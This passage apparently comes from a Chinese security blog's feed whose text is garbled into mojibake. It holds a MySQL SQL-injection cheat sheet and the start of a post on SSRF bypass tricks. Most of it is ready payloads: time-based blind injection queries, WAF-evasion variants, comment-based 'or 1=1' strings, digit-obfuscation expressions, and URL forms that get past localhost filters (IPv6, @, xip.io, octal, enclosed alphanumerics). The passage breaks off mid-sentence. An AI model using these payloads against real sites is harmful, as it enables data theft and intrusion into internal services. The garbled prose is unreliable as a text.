å›æ˜¾ï¼‰"></a>Timeï¼ˆæ— å›æ˜¾ï¼‰</h3><ul><li><code>id=87 and if(length(user())&gt;0, sleep(10), 1)=1</code></li><li><code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code></li><li><code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code></li></ul><h2 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h2><h3 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h3><ol><li>åŒå†™ ananddã€oorr</li><li>ä½¿ç”¨è¿ç®—ç¬¦ä»£æ›¿ &amp;&amp;ã€||</li><li>ç›´æ¥æ‹¼æ¥ = å·ï¼Œsuch as <code>?id=1=(condition)</code></li><li>å…¶ä»–æ–¹æ³•ï¼Œsuch as <code>?id=1^(condition)</code></li><li>å¤§å°å†™</li><li>urlencode</li></ol><h3 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h3><ol><li>å¤šå±‚ç©ºæ ¼åµŒå¥—</li><li>æ”¹ç”¨ +</li><li>ä½¿ç”¨æ³¨é‡Š /**/</li><li>and / or åé¢å¯ä»¥è·Ÿä¸Šå¶æ•°ä¸ª !ã€~ å¯ä»¥æ›¿ä»£ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥æ··åˆä½¿ç”¨ï¼ˆè§„å¾‹åˆä¸åŒï¼‰</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code> ç­‰éƒ¨åˆ†ä¸å¯è§å­—ç¬¦å¯ä¹Ÿä»£æ›¿ç©ºæ ¼</li></ol><p>such as <code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h3 id="æ‹¬å·"><a href="#æ‹¬å·" class="headerlink" title="æ‹¬å·"></a>æ‹¬å·</h3><ul><li>order by å¤§å°æ¯”è¾ƒç›²æ³¨</li></ul><p>ä¸æ‡‚QAQï¼Œæ±‚æ•™</p><h3 id="é€—å·"><a href="#é€—å·" class="headerlink" title="é€—å·"></a>é€—å·</h3><ol><li>æ”¹ç”¨ç›²æ³¨</li><li><code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code></li><li><code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code></li><li><code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code></li></ol><h3 id="å…¶ä»–ç³»ç»Ÿå…³é”®å­—"><a href="#å…¶ä»–ç³»ç»Ÿå…³é”®å­—" class="headerlink" title="å…¶ä»–ç³»ç»Ÿå…³é”®å­—"></a>å…¶ä»–ç³»ç»Ÿå…³é”®å­—</h3><ol><li>åŒå†™ç»•è¿‡å…³é”®å­—è¿‡æ»¤</li><li>ä½¿ç”¨åŒä¹‰å‡½æ•° / è¯­å¥ä»£æ›¿ï¼Œå¦‚ if å‡½æ•°å¯ç”¨<code>case when condition then 1 else 0 end</code>è¯­å¥ä»£æ›¿</li><li>å¤§å°å†™</li><li>urlencode</li></ol><h3 id="å•åŒå¼•å·è¢«è¿‡æ»¤-æ‹¦æˆª-è½¬ä¹‰"><a href="#å•åŒå¼•å·è¢«è¿‡æ»¤-æ‹¦æˆª-è½¬ä¹‰" class="headerlink" title="å•åŒå¼•å·è¢«è¿‡æ»¤ / æ‹¦æˆª / è½¬ä¹‰"></a>å•åŒå¼•å·è¢«è¿‡æ»¤ / æ‹¦æˆª / è½¬ä¹‰</h3><ol><li>éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå°è¯•æ˜¯å¦å­˜åœ¨ç¼–ç é—®é¢˜è€Œäº§ç”Ÿçš„SQLæ³¨å…¥</li><li>ä¸éœ€è¦è·³å‡ºå•å¼•å·çš„æƒ…å†µï¼šå­—ç¬¦ä¸²å¯ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œä¹Ÿå¯é€šè¿‡è¿›åˆ¶è½¬æ¢å‡½æ•°è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶ï¼Œæ± base_con</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">åè¿›åˆ¶è½¬æ¢æˆäºŒè¿›åˆ¶</span><br><span class="line">select bin(5);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆå…«è¿›åˆ¶</span><br><span class="line">select oct(5);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</span><br><span class="line">select hex(5);</span><br><span class="line">äºŒè¿›åˆ¶è½¬æ¢æˆåè¿›åˆ¶</span><br><span class="line">select conv(&#39;101&#39;,2,10);</span><br><span class="line">åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</span><br><span class="line">select conv(&#39;20&#39;,10,16);</span><br><span class="line">è¿˜åŸåå…­è¿›åˆ¶</span><br><span class="line">unhex(conv(DEC_DATA,10,16))</span><br></pre></td></tr></table></figure><h3 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h3><table><thead><tr><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>å­—</th><th>ä»£æ›¿å­—ç¬¦</th><th>æ•°</th><th>å­—</th></tr></thead><tbody><tr><td>falseã€!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20</td><td>K</td></tr><tr><td>trueã€!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22</td><td>M</td></tr><tr><td>floor(pi())ã€~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24</td><td>O</td></tr><tr><td>floor(version()) //æ³¨æ„ç‰ˆæœ¬</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16</td><td>G</td><td>floor(version()*version())</td><td>26</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17</td><td>H</td><td>ceil(version()*version())</td><td>27</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29</td><td>T</td></tr></tbody></table><hr><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;*(MySQL-5.1)</span><br><span class="line">&#x2F;**&#x2F;(ä¸€ä¸ª *&#x2F; å¯ä»¥é—­åˆå‰é¢å¤šä¸ª&#x2F;*)</span><br><span class="line">;%00(PDOæ”¯æ´å¤šèªå¥)</span><br><span class="line">&#96;(MySQL &lt;&#x3D; 5.5)</span><br><span class="line">&#39;or 1&#x3D;1;%00</span><br><span class="line">&#39;or 1&#x3D;1 union select 1,2&#96;&#39;</span><br><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">&#39;&#x2F;*!50000or*&#x2F; 1&#x3D;1 -- -      &#x2F;&#x2F;ç‰ˆæœ¬å·ä¸º5.1.38æ—¶åªè¦å°äº50138</span><br><span class="line">&#39;&#x2F;*!or*&#x2F; 1&#x3D;1 -- -</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h3><h4 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h4><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>ä¸ï¼ŒåŒand</td><td>||</td><td>æˆ–ï¼ŒåŒor</td></tr><tr><td>!</td><td>éï¼ŒåŒnot</td><td>~</td><td>ä¸€å…ƒæ¯”ç‰¹åè½¬</td></tr><tr><td>^</td><td>å¼‚æˆ–ï¼ŒåŒxor</td><td>+</td><td>åŠ ï¼Œå¯æ›¿ä»£ç©ºæ ¼ï¼Œå¦‚ <code>select+user()</code></td></tr></tbody></table><h4 id="ç³»ç»Ÿä¿¡æ¯å‡½æ•°"><a href="#ç³»ç»Ÿä¿¡æ¯å‡½æ•°" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯å‡½æ•°"></a>ç³»ç»Ÿä¿¡æ¯å‡½æ•°</h4><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>USER()</td><td>è·å–å½“å‰æ“ä½œå¥æŸ„çš„ç”¨æˆ·åï¼ŒåŒ SESSION_USER()ã€CURRENT_USER()ï¼Œæœ‰æ—¶ä¹Ÿç”¨ SYSTEM_USER()</td></tr><tr><td>DATABASE()</td><td>è·å–å½“å‰é€‰æ‹©çš„æ•°æ®åº“åï¼ŒåŒ SCHEMA()</td></tr><tr><td>VERSION()</td><td>è·å–å½“å‰ç‰ˆæœ¬ä¿¡æ¯</td></tr></tbody></table><h4 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h4><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ORD(str)</td><td>è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIå€¼</td></tr><tr><td>OCT(N)</td><td>ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å› <code>N</code> çš„å…«è¿›åˆ¶æ•°ï¼Œ<code>N</code> æ˜¯ä¸€ä¸ªBIGINT å‹æ•°å€¼ï¼Œä½œç”¨ç›¸å½“äº<code>CONV(N,10,8)</code></td></tr><tr><td>HEX(N_S)</td><td>å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè¿”å› <code>N_or_S</code> çš„16è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ºæ•°å­—æ—¶ï¼Œè¿”å›å…¶16è¿›åˆ¶æ•°å½¢å¼</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> çš„é€†å‘å‡½æ•°ã€‚å°†å‚æ•°ä¸­çš„æ¯ä¸€å¯¹16è¿›åˆ¶æ•°å­—éƒ½è½¬æ¢ä¸º10è¿›åˆ¶æ•°å­—ï¼Œç„¶åå†è½¬æ¢æˆ ASCII ç æ‰€å¯¹åº”çš„å­—ç¬¦</td></tr><tr><td>BIN(N)</td><td>è¿”å›åè¿›åˆ¶æ•°å€¼ <code>N</code> çš„äºŒè¿›åˆ¶æ•°å€¼çš„å­—ç¬¦ä¸²è¡¨ç°å½¢å¼</td></tr><tr><td>ASCII(str)</td><td>åŒ<code>ORD(string)</code></td></tr><tr><td>CONV(N,from_base,to_base)</td><td>å°†æ•°å€¼å‹å‚æ•° <code>N</code> ç”±åˆå§‹è¿›åˆ¶ <code>from_base</code> è½¬æ¢ä¸ºç›®æ ‡è¿›åˆ¶ <code>to_base</code> çš„å½¢å¼å¹¶è¿”å›</td></tr><tr><td>CHAR(N,â€¦ [USING charset_name])</td><td>å°†æ¯ä¸€ä¸ªå‚æ•° <code>N</code> éƒ½è§£é‡Šä¸ºæ•´æ•°ï¼Œè¿”å›ç”±è¿™äº›æ•´æ•°åœ¨ ASCII ç ä¸­æ‰€å¯¹åº”å­—ç¬¦æ‰€ç»„æˆçš„å­—ç¬¦ä¸²</td></tr></tbody></table><h4 id="å­—ç¬¦æˆªå–-æ‹¼æ¥"><a href="#å­—ç¬¦æˆªå–-æ‹¼æ¥" class="headerlink" title="å­—ç¬¦æˆªå–/æ‹¼æ¥"></a>å­—ç¬¦æˆªå–/æ‹¼æ¥</h4><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œæˆªå–ï¼Œä¸ºSUBSTRINGçš„ç®€å•ç‰ˆ</td></tr><tr><td>SUBSTRING()</td><td>å¤šç§æ ¼å¼<code>SUBSTRING(str,pos)ã€SUBSTRING(str FROM pos)ã€SUBSTRING(str,pos,len)ã€SUBSTRING(str FROM pos FOR len)</code></td></tr><tr><td>RIGHT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å³è¾¹æˆªå–æŒ‡å®šé•¿åº¦</td></tr><tr><td>LEFT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å·¦è¾¹æˆªå–æŒ‡å®šé•¿åº¦</td></tr><tr><td>RPAD(str,len,padstr)</td><td>åœ¨ <code>str</code> å³æ–¹è¡¥é½ <code>len</code> ä½çš„å­—ç¬¦ä¸² <code>padstr</code>ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ã€‚å¦‚æœ <code>str</code> é•¿åº¦å¤§äº <code>len</code>ï¼Œåˆ™è¿”å›å€¼çš„é•¿åº¦å°†ç¼©å‡åˆ° <code>len</code> æ‰€æŒ‡å®šçš„é•¿åº¦</td></tr><tr><td>LPAD(str,len,padstr)</td><td>ä¸RPADç›¸ä¼¼ï¼Œåœ¨<code>str</code>å·¦è¾¹è¡¥é½</td></tr><tr><td>MID(str,pos,len)</td><td>åŒäº <code>SUBSTRING(str,pos,len)</code></td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>åœ¨åŸå§‹å­—ç¬¦ä¸² <code>str</code> ä¸­ï¼Œå°†è‡ªå·¦æ•°ç¬¬ <code>pos</code> ä½å¼€å§‹ï¼Œé•¿åº¦ä¸º <code>len</code> ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ–°å­—ç¬¦ä¸² <code>newstr</code>ï¼Œç„¶åè¿”å›ç»è¿‡æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚<code>INSERT(str,len,1,0x0)</code>å¯å½“åšæˆªå–å‡½æ•°</td></tr><tr><td>CONCAT(str1,str2â€¦)</td><td>å‡½æ•°ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</td></tr><tr><td>GROUP_CONCAT(â€¦)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆ</td></tr><tr><td>MAKE_SET(bits,str1,str2,â€¦)</td><td>æ ¹æ®å‚æ•°1ï¼Œè¿”å›æ‰€è¾“å…¥å…¶ä»–çš„å‚æ•°å€¼ã€‚å¯ç”¨ä½œå¸ƒå°”ç›²æ³¨ï¼Œå¦‚ï¼š<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code></td></tr></tbody></table><h4 id="å¸¸è§å…¨å±€å˜é‡"><a href="#å¸¸è§å…¨å±€å˜é‡" class="headerlink" title="å¸¸è§å…¨å±€å˜é‡"></a>å¸¸è§å…¨å±€å˜é‡</h4><table><thead><tr><th>å˜é‡</th><th>è¯´æ˜</th><th>å˜é‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>@@VERSION</td><td>è¿”å›ç‰ˆæœ¬ä¿¡æ¯</td><td>@@HOSTNAME</td><td>è¿”å›å®‰è£…çš„è®¡ç®—æœºåç§°</td></tr><tr><td>@@GLOBAL.VERSION</td><td>åŒ<code>@@VERSION</code></td><td>@@BASEDIR</td><td>è¿”å›MYSQLç»å¯¹è·¯å¾„</td></tr></tbody></table><p>å¯ä»¥ç”¨ <code>SHOW GLOBAL VARIABLES;</code> æŸ¥çœ‹å…¨éƒ¨å…¨å±€å˜é‡</p><h4 id="å…¶ä»–å¸¸ç”¨å‡½æ•°-è¯­å¥"><a href="#å…¶ä»–å¸¸ç”¨å‡½æ•°-è¯­å¥" class="headerlink" title="å…¶ä»–å¸¸ç”¨å‡½æ•° / è¯­å¥"></a>å…¶ä»–å¸¸ç”¨å‡½æ•° / è¯­å¥</h4><table><thead><tr><th>å‡½æ•°/è¯­å¥</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</td></tr><tr><td>PI()</td><td>è¿”å›Ï€çš„å…·ä½“æ•°å€¼</td></tr><tr><td>REGEXP â€œstatementâ€</td><td>æ­£åˆ™åŒ¹é…æ•°æ®ï¼Œè¿”å›å€¼ä¸ºå¸ƒå°”å€¼</td></tr><tr><td>LIKE â€œstatementâ€</td><td>åŒ¹é…æ•°æ®ï¼Œ%ä»£è¡¨ä»»æ„å†…å®¹ã€‚è¿”å›å€¼ä¸ºå¸ƒå°”å€¼</td></tr><tr><td>RLIKE â€œstatementâ€</td><td>ä¸regexpç›¸åŒ</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>è¿”å›å­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</td></tr><tr><td>POSITION(substr IN str)</td><td>ç­‰åŒäº <code>LOCATE()</code></td></tr><tr><td>LOWER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å¤§å†™å­—æ¯å…¨éƒ¨è½¬æˆå°å†™ã€‚åŒï¼š<code>LCASE(str)</code></td></tr><tr><td>UPPER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å°å†™å­—æ¯å…¨éƒ¨è½¬æˆå¤§å†™ã€‚åŒï¼š<code>UCASE(str)</code></td></tr><tr><td>ELT(N,str1,str2,str3,â€¦)</td><td>ä¸<code>MAKE_SET(bit,str1,str2...)</code>ç±»ä¼¼ï¼Œæ ¹æ®<code>N</code>è¿”å›å‚æ•°å€¼</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>è‹¥expr1ä¸expr2ç›¸åŒï¼Œåˆ™è¿”å›expr1ï¼Œå¦åˆ™è¿”å›NULL</td></tr><tr><td>CHARSET(str)</td><td>è¿”å›å­—ç¬¦ä¸²ä½¿ç”¨çš„å­—ç¬¦é›†</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>ä½¿ç”¨ pass_str ä½œä¸ºå¯†ç ï¼Œè§£å¯†åŠ å¯†å­—ç¬¦ä¸² crypt_strã€‚åŠ å¯†å‡½æ•°ï¼š<code>ENCODE(str,pass_str)</code></td></tr></tbody></table><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFçš„ä¸€äº›tricks</title>
      <link href="2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<p>SSRF æ˜¯ä»€ä¹ˆï¼Ÿç®€å•åœ°æ¥è¯´ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“ä½œè·³æ¿æ¥æ”»å‡»å†…éƒ¨å…¶ä»–æœåŠ¡</p><p>å¯ä»¥ç”¨æ¥ï¼š</p><ul><li>æ¢æµ‹å†…ç½‘ä¿¡æ¯</li><li>æ”»å‡»å†…ç½‘æˆ–æœ¬åœ°å…¶ä»–æœåŠ¡</li><li>ç©¿é€é˜²ç«å¢™</li></ul><p>å¯»æ‰¾æ–¹æ³•ï¼š</p><ul><li>èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹</li><li>è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹</li><li>æ•°æ®åº“å†…ç½®åŠŸèƒ½</li><li>é‚®ä»¶ç³»ç»Ÿ</li><li>æ–‡ä»¶å¤„ç†</li><li>åœ¨çº¿å¤„ç†å·¥å…·</li></ul><h1 id="ä¸€äº›ç»•è¿‡çš„æ–¹æ³•"><a href="#ä¸€äº›ç»•è¿‡çš„æ–¹æ³•" class="headerlink" title="ä¸€äº›ç»•è¿‡çš„æ–¹æ³•"></a>ä¸€äº›ç»•è¿‡çš„æ–¹æ³•</h1><h2 id="0x00-æ”»å‡»æœ¬åœ°"><a href="#0x00-æ”»å‡»æœ¬åœ°" class="headerlink" title="0x00 æ”»å‡»æœ¬åœ°"></a>0x00 æ”»å‡»æœ¬åœ°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:80</span><br><span class="line">http:&#x2F;&#x2F;localhost:22</span><br></pre></td></tr></table></figure><h2 id="0x01-åˆ©ç”¨ipv6"><a href="#0x01-åˆ©ç”¨ipv6" class="headerlink" title="0x01 åˆ©ç”¨ipv6"></a>0x01 åˆ©ç”¨ipv6</h2><p>åˆ©ç”¨[::]ç»•è¿‡localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1]&#x2F; &gt;&gt;&gt; http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">http:&#x2F;&#x2F;[::]&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;0.0.0.0</span><br></pre></td></tr></table></figure><p>ä¹Ÿæœ‰ <code>http://0000::1:80/</code> è¿™ç§</p><h2 id="0x02-åˆ©ç”¨"><a href="#0x02-åˆ©ç”¨" class="headerlink" title="0x02 åˆ©ç”¨@"></a>0x02 åˆ©ç”¨@</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com@127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x03-åˆ©ç”¨çŸ­åœ°å€"><a href="#0x03-åˆ©ç”¨çŸ­åœ°å€" class="headerlink" title="0x03 åˆ©ç”¨çŸ­åœ°å€"></a>0x03 åˆ©ç”¨çŸ­åœ°å€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x04-åˆ©ç”¨ç‰¹æ®ŠåŸŸå"><a href="#0x04-åˆ©ç”¨ç‰¹æ®ŠåŸŸå" class="headerlink" title="0x04 åˆ©ç”¨ç‰¹æ®ŠåŸŸå"></a>0x04 åˆ©ç”¨ç‰¹æ®ŠåŸŸå</h2><p>åˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x05-åˆ©ç”¨DNSè§£æ"><a href="#0x05-åˆ©ç”¨DNSè§£æ" class="headerlink" title="0x05 åˆ©ç”¨DNSè§£æ"></a>0x05 åˆ©ç”¨DNSè§£æ</h2><p>åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1</p><h2 id="0x06-åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ "><a href="#0x06-åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ " class="headerlink" title="0x06 åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ "></a>0x06 åˆ©ç”¨ä¿®æ”¹ä¸Šä¼ </h2><p>æ¯”å¦‚å¯ä»¥ä¿®æ”¹ â€œtype=fileâ€ ä¸º â€œtype=urlâ€<br>å°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘ SSRF</p><h2 id="0x07-åˆ©ç”¨Enclosed-alphanumerics"><a href="#0x07-åˆ©ç”¨Enclosed-alphanumerics" class="headerlink" title="0x07 åˆ©ç”¨Enclosed alphanumerics"></a>0x07 åˆ©ç”¨Enclosed alphanumerics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨Enclosed alphanumerics</span><br><span class="line">â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ </span><br><span class="line">â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ </span><br><span class="line">â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› </span><br><span class="line">â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ </span><br><span class="line">â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ </span><br><span class="line">â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© </span><br><span class="line">â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ </span><br><span class="line">â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h2 id="0x08-åˆ©ç”¨å¥å·"><a href="#0x08-åˆ©ç”¨å¥å·" class="headerlink" title="0x08 åˆ©ç”¨å¥å·"></a>0x08 åˆ©ç”¨å¥å·</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="0x09-åˆ©ç”¨è¿›åˆ¶è½¬æ¢"><a href="#0x09-åˆ©ç”¨è¿›åˆ¶è½¬æ¢" class="headerlink" title="0x09 åˆ©ç”¨è¿›åˆ¶è½¬æ¢"></a>0x09 åˆ©ç”¨è¿›åˆ¶è½¬æ¢</h2><p>å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">http:&#x2F;&#x2F;016373751032&#x2F;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1a<br>ç„¶åæŠŠ 73efd21a 